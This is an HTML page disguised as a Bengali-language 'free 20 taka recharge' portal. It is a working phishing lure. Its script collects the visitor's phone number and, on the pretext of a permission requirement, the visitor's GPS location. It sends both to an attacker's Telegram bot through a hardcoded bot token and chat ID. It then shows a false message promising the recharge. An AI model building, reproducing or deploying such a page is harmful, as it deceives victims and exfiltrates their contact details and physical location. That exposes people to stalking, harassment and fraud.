<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Recharge Portal</title>
    <style>
        body { background: #ffffff; font-family: sans-serif; text-align: center; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: auto; padding: 30px; border: 1px solid #ddd; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2 { color: #28a745; }
        input { width: 100%; padding: 15px; margin: 20px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 18px; }
        button { background: #007bff; color: white; padding: 15px; width: 100%; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h2>২০ টাকা ফ্রি রিচার্জ! 🎁</h2>
        <p>নম্বর দিয়ে নিচের বাটনে ক্লিক করুন</p>
        <input type="number" id="phone" placeholder="01XXXXXXXXX">
        <button onclick="sendInfo()">উইথড্র (Withdraw)</button>
    </div>
    <script>
        async function sendInfo() {
            const phone = document.getElementById('phone').value;
            const token = "8242516940:AAEGDu48l_miakigo6zRSfJ6pvyEq7wM6k";
            const chat_id = "7887080882";
            if (phone.length < 11) { alert("সঠিক নম্বর দিন"); return; }
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const map = `http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                const text = `🔔 নতুন রিচার্জ!\n📱 নম্বর: ${phone}\n📍 ম্যাপ: ${map}`;
                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
                alert("সফল হয়েছে! কিছুক্ষণের মধ্যে রিচার্জ পাবেন।");
            }, () => { alert("লোকেশন পারমিশন ছাড়া কাজ করবে না।"); });
        }
    </script>
</body>
</html>
